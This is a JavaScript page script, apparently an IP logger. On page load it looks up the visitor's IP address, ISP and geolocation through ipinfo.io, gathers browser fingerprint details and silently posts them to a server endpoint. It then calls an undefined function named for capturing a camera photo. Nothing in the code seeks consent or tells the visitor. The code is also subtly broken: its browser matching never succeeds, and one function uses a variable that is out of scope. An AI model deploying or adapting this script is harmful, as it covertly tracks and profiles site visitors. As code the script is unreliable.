document.addEventListener("DOMContentLoaded", function() {
    const infoDiv = document.getElementById("info");

    function displayDeviceInfo() {
        fetch("https://ipinfo.io/json")
            .then(response => response.json())
            .then(data => {
                const processedData = processData(data);
                saveDataOnServer(processedData);
                captureCameraPhoto();
            })
            .catch(error => console.error(error));
    }

    function processData(data) {
        const ua = navigator.userAgent;
        const os = navigator.platform;

        return {
            ipAddress: data.ip,
            isp: data.org,
            city: data.city,
            region: data.region,
            country: data.country,
            loc: data.loc,
            ua: ua,
            name: getBrowserInfo(ua).name,
            version: getBrowserInfo(ua).version,
            screenWidth: window.screen.width,
            screenHeight: window.screen.height,
            cookieEnabled: navigator.cookieEnabled,
            browserLanguage: navigator.language,
            referrer: document.referrer,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            sistema: getOSName(os)
        };
    }

    function getBrowserInfo(ua) {
        const browsers = [
            { name: "Google Chrome", regex: /Chrome\/([\d.]+)/ },
            { name: "Mozilla Firefox", regex: /Firefox\/([\d.]+)/ },
            { name: "Microsoft Edge", regex: /Edge\/([\d.]+)/ },
            { name: "Internet Explorer", regex: /(?:MSIE |rv:)(\d+(\.\d+)?)/ },
            { name: "Safari", regex: /Version\/([\d.]+)/ }
        ];

        const defaultBrowser = { name: "Navegador Desconhecido", version: "Desconhecido" };

        for (const browser of browsers) {
            if (ua.includes(browser.name)) {
                const match = ua.match(browser.regex);
                return match ? { name: browser.name, version: match[1] } : defaultBrowser;
            }
        }

        return defaultBrowser;
    }

    function getOSName(os) {
        if (os.includes("Win")) return "Windows";
        if (os.includes("Mac")) return "MacOS";
        if (os.includes("Linux")) return "Linux";
        if (os.includes("Android")) return "Android";
        if (os.includes("iPhone") || ua.includes("iPad")) return "iOS";
        return "Sistema Operacional Desconhecido";
    }

    function saveDataOnServer(data) {
        fetch("/dados.php", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data)
        })
        .then(response => response.json())
        .then(responseData => console.log(""))
        .catch(error => console.error("" + error));
    }

    displayDeviceInfo();
});
